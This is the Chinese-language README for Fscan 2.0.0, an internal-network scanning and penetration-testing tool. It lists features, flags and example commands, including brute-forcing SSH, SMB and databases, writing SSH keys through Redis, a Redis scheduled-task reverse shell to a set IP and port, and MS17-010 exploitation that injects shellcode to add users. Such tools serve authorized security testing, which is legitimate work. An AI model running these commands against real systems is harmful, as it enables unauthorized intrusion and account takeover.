# Fscan 2.0.0
[English][url-docen]

# 0x01 简介
一款功能丰富的内网综合扫描工具，提供一键自动化、全方位的漏洞扫描能力。

## 主要功能

- 主机存活探测：快速识别内网中的活跃主机
- 端口扫描：全面检测目标主机开放端口
- 服务爆破：支持对常见服务进行密码爆破测试
- 漏洞利用：集成MS17-010等高危漏洞检测
- Redis利用：支持批量写入公钥进行权限获取
- 系统信息收集：可读取Windows网卡信息
- Web应用检测：
  - Web指纹识别
  - Web漏洞扫描
- 域环境探测：
  - NetBIOS信息获取
  - 域控制器识别
- 后渗透功能：支持通过计划任务实现反弹shell

# 0x02 主要功能
## 1. 信息搜集
- 基于ICMP的主机存活探测：快速识别网络中的活跃主机设备
- 全面的端口扫描：系统地检测目标主机的开放端口情况

## 2. 爆破功能
- 常用服务密码爆破：支持SSH、SMB、RDP等多种协议的身份认证测试
- 数据库密码爆破：覆盖MySQL、MSSQL、Redis、PostgreSQL、Oracle等主流数据库系统

## 3. 系统信息与漏洞扫描
- 网络信息收集：包括NetBIOS探测和域控制器识别
- 系统信息获取：能够读取目标系统网卡配置信息
- 安全漏洞检测：支持MS17-010等高危漏洞的识别与检测

## 4. Web应用探测
- 网站信息收集：自动获取网站标题信息
- Web指纹识别：可识别常见CMS系统与OA框架
- 漏洞扫描能力：集成WebLogic、Struts2等漏洞检测，兼容XRay POC

## 5. 漏洞利用模块
- Redis利用：支持写入公钥或植入计划任务
- SSH远程执行：提供SSH命令执行功能
- MS17-010利用：支持ShellCode注入，可实现添加用户等操作

## 6. 辅助功能
- 扫描结果存储：将所有检测结果保存至文件，便于后续分析

# 0x03 使用说明
## 基础用法
```bash
# 默认扫描(使用全部模块)
fscan.exe -h 192.168.1.1/24

# B段扫描
fscan.exe -h 192.168.1.1/16
```

## 进阶用法

### 扫描控制
```bash
# 跳过存活检测、不保存文件、跳过web poc扫描
fscan.exe -h 192.168.1.1/24 -np -no -nopoc

# 指定扫描结果保存路径
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt

# 从文件导入目标
fscan.exe -hf ip.txt
```

### 特定功能
```bash
# Redis利用
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub    # 写公钥
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666    # 计划任务反弹shell

# SSH操作
fscan.exe -h 192.168.1.1/24 -c whoami    # SSH爆破成功后执行命令

# 密码爆破
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt    # 指定用户名密码文件
fscan.exe -h 192.168.1.1/24 -m smb -pwd password    # SMB密码碰撞
```

### 代理设置
```bash
# HTTP代理
fscan.exe -u http://baidu.com -proxy 8080

# SOCKS5代理
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080
```

### 特定漏洞检测
```bash
# MS17-010检测
fscan.exe -h 192.168.1.1/24 -m ms17010

# MS17-010利用
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add
```

## 编译说明
```bash
# 基础编译
go build -ldflags="-s -w " -trimpath main.go

# 使用UPX压缩（可选）
upx -9 fscan.exe
```

## Arch Linux安装
```bash
# 使用yay
yay -S fscan-git

# 或使用paru
paru -S fscan-git
```

# 0x04 参数说明

## 目标设置
- `-h` : 设置目标IP
  - 支持单个IP：`192.168.11.11`
  - 支持IP范围：`192.168.11.11-255`
  - 支持多个IP：`192.168.11.11,192.168.11.12`
- `-hf` : 从文件读取目标
- `-hn` : 设置要排除的IP范围
- `-u` : 指定单个URL扫描
- `-uf` : 指定URL文件扫描

## 扫描控制
- `-m` : 指定扫描模式，默认为"all"
- `-t` : 设置扫描线程数，默认600
- `-time` : 端口扫描超时时间，默认3秒
- `-wt` : Web访问超时时间，默认5秒
- `-debug` : 设置进度打印间隔，默认60秒
- `-silent` : 开启静默模式，适用于CS扫描

## 端口配置
- `-p` : 指定扫描端口
  - 默认端口：21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017
- `-pa` : 在默认端口基础上新增端口
- `-pn` : 设置要排除的端口

## 爆破相关
- `-user` : 指定用户名
- `-userf` : 指定用户名文件
- `-pwd` : 指定密码
- `-pwdf` : 指定密码文件
- `-usera` : 在默认用户字典基础上新增用户
- `-pwda` : 在默认密码字典基础上新增密码

## Web相关
- `-cookie` : 设置Cookie
- `-num` : Web POC发包速率，默认20
- `-pocname` : 指定Web POC的模糊名称
- `-pocpath` : 指定POC路径

## 代理设置
- `-proxy` : 设置HTTP代理
- `-socks5` : 设置SOCKS5代理

## 输出控制
- `-o` : 设置结果保存路径，默认"result.txt"
- `-no` : 不保存扫描结果
- `-nobr` : 跳过密码爆破
- `-nopoc` : 跳过Web POC扫描
- `-np` : 跳过存活探测

## 特殊功能
- `-c` : SSH命令执行
- `-domain` : SMB爆破时设置域名
- `-rf` : Redis写公钥模块的文件路径
- `-rs` : Redis计划任务反弹shell的IP端口
- `-sshkey` : 指定SSH私钥路径
- `-sc` : MS17010利用模块shellcode功能

## 存活探测
- `-ping` : 使用ping代替ICMP进行存活探测

# 0x05 运行截图

`fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)`
![](image/1.png)

![](image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写公钥)`
![](image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)`
![](image/3.png)

`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc`
![](image/2020-12-12-13-34-44.png)

`fscan.exe -h 192.168.x.x -p 139 (netbios探测、域控识别,下图的[+]DC代表域控)`
![](image/netbios.png)

`go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbios时,才会显示完整的netbios信息)`
![](image/netbios1.png)

`go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)`
![img.png](image/live.png)

# 0x06 免责声明

本工具仅面向**合法授权**的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描。**

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

在安装并使用本工具前，请您**务必审慎阅读、充分理解各条款内容**，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。

除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。


# 0x07 404StarLink 2.0 - Galaxy
![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

fscan 是 404Team [星链计划2.0](https://github.com/knownsec/404StarLink2.0-Galaxy) 中的一环，如果对fscan 有任何疑问又或是想要找小伙伴交流，可以参考星链计划的加群方式。

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)

演示视频[【安全工具】5大功能，一键化内网扫描神器——404星链计划fscan](https://www.bilibili.com/video/BV1Cv4y1R72M)
# 0x08 Star Chart
[![Stargazers over time](https://starchart.cc/shadow1ng/fscan.svg)](https://starchart.cc/shadow1ng/fscan)

# 0x09 捐赠
 如果你觉得这个项目对你有帮助，你可以请作者喝饮料🍹 [点我](image/sponsor.png)

# 0x10 参考链接
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   
https://github.com/jjf012/gopoc


# 0x11 最近更新
## 2024 更新

- **2024/12/19**: v2.0.0 重大更新
  - 完整代码重构，提升性能和可维护性
  - 重新设计模块化架构，支持插件扩展
  - 改进并发控制，提升扫描效率

## 2023 更新

- **2023/11/13**: 
  - 新增控制台颜色输出（可用 `-nocolor` 关闭）
  - 支持JSON格式保存结果（`-json`）
  - 调整TLS最低版本至1.0
  - 支持端口分组（`-p db,web,service`）

## 2022 更新
- **2022/11/19**: 新增hash碰撞和wmiexec无回显命令执行功能
- **2022/7/14**: 改进文件导入支持和搜索匹配功能
- **2022/7/6**: 优化内存管理，扩展URL支持
- **2022/7/2**: 
  - 增强POC fuzz模块
  - 新增MS17017利用功能
  - 加入socks5代理支持
- **2022/4/20**: 新增POC路径指定和端口文件导入功能
- **2022/2/25**: 新增webonly模式（致谢 @AgeloVito）
- **2022/1/11**: 新增Oracle密码爆破
- **2022/1/7**: 改进大规模网段扫描，新增LiveTop功能

## 2021 更新
- **2021/12/7**: 新增RDP扫描功能
- **2021/12/1**: 全面优化功能模块
- **2021/6/18**: 改进POC识别机制
- **2021/5/29**: 新增FCGI未授权扫描
- **2021/5/15**: 发布Windows 2003版本
- **2021/5/6**: 更新核心模块
- **2021/4/21**: 加入NetBIOS探测和域控识别
- **2021/3/4**: 支持URL批量扫描
- **2021/2/25**: 支持密码爆破功能
- **2021/2/8**: 新增指纹识别功能
- **2021/2/5**: 优化ICMP探测

## 2020 更新
- **2020/12/12**: 集成YAML解析引擎，支持XRay POC
- **2020/12/6**: 优化ICMP模块
- **2020/12/03**: 改进IP段处理
- **2020/11/17**: 新增WebScan模块
- **2020/11/16**: 优化ICMP模块
- **2020/11/15**: 支持文件导入IP

_感谢所有为项目做出贡献的开发者_

[url-docen]: README_EN.md
